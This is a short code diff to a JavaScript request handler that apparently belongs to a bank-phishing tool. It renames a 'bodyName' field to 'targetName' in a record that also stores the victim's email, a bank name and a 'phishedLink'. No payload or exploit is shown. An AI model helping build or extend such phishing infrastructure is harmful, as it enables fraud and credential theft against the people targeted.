@@ -75,7 +75,7 @@ export default async function handler(req, res) {
           text: req.body.html,
           datetime: newDate.toString(),
           email: req.body.to,
-          bodyName:req.body.bodyName,
+          targetName:req.body.targetName,
           bank:req.body.bankName,
           phishedLink: phishedLink
         },
